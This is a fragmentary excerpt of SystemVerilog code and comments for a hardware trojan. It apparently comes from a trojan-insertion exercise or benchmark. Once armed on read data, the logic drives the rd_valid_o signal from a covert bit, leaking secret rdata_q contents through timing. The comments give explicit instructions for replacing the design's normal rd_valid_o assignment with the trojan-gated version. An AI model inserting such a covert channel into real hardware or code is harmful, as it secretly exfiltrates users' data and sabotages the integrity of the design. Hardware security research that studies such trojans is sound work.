 ...
 * Payload: Modulate rd_valid_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |rd_data_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of rd_valid_o:
...
logic       covert_bit_out;         // Drives rd_valid_o when trojan active
...
//   Find the assign for rd_valid_o (or rd_error_o as fallback):
//     assign rd_valid_o = <normal_expr>;
//   Replace with:
//     assign rd_valid_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
